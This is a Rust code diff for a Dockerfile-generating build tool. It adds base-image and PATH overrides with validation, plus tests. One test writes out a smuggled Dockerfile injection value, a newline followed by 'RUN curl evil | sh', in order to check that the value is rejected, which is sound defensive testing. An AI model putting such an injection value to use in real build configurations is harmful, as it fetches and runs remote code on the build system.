@@ -30,6 +30,12 @@ pub struct BuildOverrides {
     pub build_apt_packages: Vec<String>,
     /// Apt packages to install in the final runtime image.
     pub deploy_apt_packages: Vec<String>,
+    /// Override the base image of the final runtime stage.
+    pub runtime_image: Option<String>,
+    /// Override the base image of the first build stage.
+    pub build_image: Option<String>,
+    /// Directories to prepend to `PATH` in the runtime image.
+    pub paths: Vec<String>,
 }
 
 impl BuildOverrides {
@@ -54,6 +60,11 @@ impl BuildOverrides {
         if self.deploy_apt_packages.is_empty() {
             self.deploy_apt_packages = lower.deploy_apt_packages;
         }
+        self.runtime_image = self.runtime_image.or(lower.runtime_image);
+        self.build_image = self.build_image.or(lower.build_image);
+        if self.paths.is_empty() {
+            self.paths = lower.paths;
+        }
         self
     }
 
@@ -75,6 +86,9 @@ impl BuildOverrides {
             env: std::collections::BTreeMap::new(),
             build_apt_packages: get("KILN_BUILD_APT_PACKAGES").map(split).unwrap_or_default(),
             deploy_apt_packages: get("KILN_DEPLOY_APT_PACKAGES").map(split).unwrap_or_default(),
+            runtime_image: get("KILN_RUNTIME_IMAGE"),
+            build_image: get("KILN_BUILD_IMAGE"),
+            paths: get("KILN_PATHS").map(split).unwrap_or_default(),
         }
     }
 
@@ -189,6 +203,9 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     let env = overrides.env.clone();
     let build_apt = overrides.build_apt_packages.clone();
     let deploy_apt = overrides.deploy_apt_packages.clone();
+    let runtime_image = overrides.runtime_image.clone();
+    let build_image = overrides.build_image.clone();
+    let paths = overrides.paths.clone();
     let ctx = AppContext::with_overrides(root, overrides)?;
 
     let mut plan = if let Some(name) = forced_provider {
@@ -215,8 +232,31 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     }
     plan.env = env;
     apply_apt_packages(&mut plan, &build_apt, &deploy_apt)?;
+    apply_base_images(&mut plan, build_image, runtime_image)?;
+    for path in &paths {
+        crate::sanitize::validate_token("PATH entry", path)?;
+    }
+    plan.paths = paths;
 
     Ok(plan)
+}
+
+/// Override the build and/or runtime stage base images with validated refs.
+/// The build image applies to the first stage, the runtime image to the last.
+fn apply_base_images(plan: &mut BuildPlan, build_image: Option<String>, runtime_image: Option<String>) -> Result<()> {
+    if let Some(image) = build_image {
+        crate::sanitize::validate_image_ref(&image)?;
+        if let Some(stage) = plan.stages.first_mut() {
+            stage.base_image = image;
+        }
+    }
+    if let Some(image) = runtime_image {
+        crate::sanitize::validate_image_ref(&image)?;
+        if let Some(stage) = plan.stages.last_mut() {
+            stage.base_image = image;
+        }
+    }
+    Ok(())
 }
 
 /// Install user-requested apt packages: build packages in the first stage,
@@ -398,6 +438,42 @@ mod tests {
         let merged = cli.or(env);
         assert_eq!(merged.version.as_deref(), Some("22"), "CLI version wins");
         assert_eq!(merged.provider.as_deref(), Some("node"), "env fills the gap");
+    }
+
+    #[test]
+    fn config_overrides_base_images_and_paths() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            r#"{"build_image":"golang:1.23-bookworm","runtime_image":"gcr.io/distroless/base-debian12","paths":["/opt/bin","/usr/local/app/bin"]}"#,
+        )
+        .unwrap();
+        let plan = detect_and_plan(dir.path()).unwrap();
+        assert_eq!(plan.stages.first().unwrap().base_image, "golang:1.23-bookworm");
+        assert_eq!(
+            plan.stages.last().unwrap().base_image,
+            "gcr.io/distroless/base-debian12"
+        );
+        assert_eq!(plan.paths, vec!["/opt/bin", "/usr/local/app/bin"]);
+
+        let dockerfile = crate::dockerfile::generate(&plan);
+        assert!(
+            dockerfile.contains("ENV PATH=\"/opt/bin:/usr/local/app/bin:$PATH\""),
+            "{dockerfile}"
+        );
+    }
+
+    #[test]
+    fn malicious_base_image_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            r#"{"runtime_image":"img\nRUN curl evil | sh"}"#,
+        )
+        .unwrap();
+        assert!(detect_and_plan(dir.path()).is_err());
     }
 
     #[test]
